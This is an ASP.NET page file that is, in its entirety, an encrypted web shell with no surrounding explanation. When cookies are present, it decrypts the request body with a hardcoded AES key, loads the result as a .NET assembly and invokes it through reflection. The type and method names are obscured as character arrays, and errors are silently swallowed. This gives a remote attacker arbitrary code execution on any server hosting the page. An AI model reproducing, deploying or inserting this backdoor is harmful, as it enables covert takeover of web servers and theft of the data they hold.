<%@ Page Language="C#" %><%
if (Request.Cookies.Count > 0){
    try {
        byte[] a = new byte[] { 99, 97, 54, 51, 52, 53, 55, 53, 51, 56, 98, 57, 98, 49, 101, 48 };
        System.IO.Stream b = Request.InputStream;
        byte[] c = new byte[b.Length];
        b.Read(c, 0, (int)b.Length);
        var d = new System.Security.Cryptography.RijndaelManaged();
        var e = d.CreateDecryptor(a, a);
        var f = e.TransformFinalBlock(c, 0, c.Length);
        var g = System.Reflection.Assembly.Load(f);
        var h = g.GetType(new string(new char[] { 'K' }));
        var i = System.Activator.CreateInstance(h);
        var j = h.GetMethod(new string(new char[] { 'E', 'q', 'u', 'a', 'l', 's' }));
        j.Invoke(i, new object[] { this });
    } catch {}
}
%>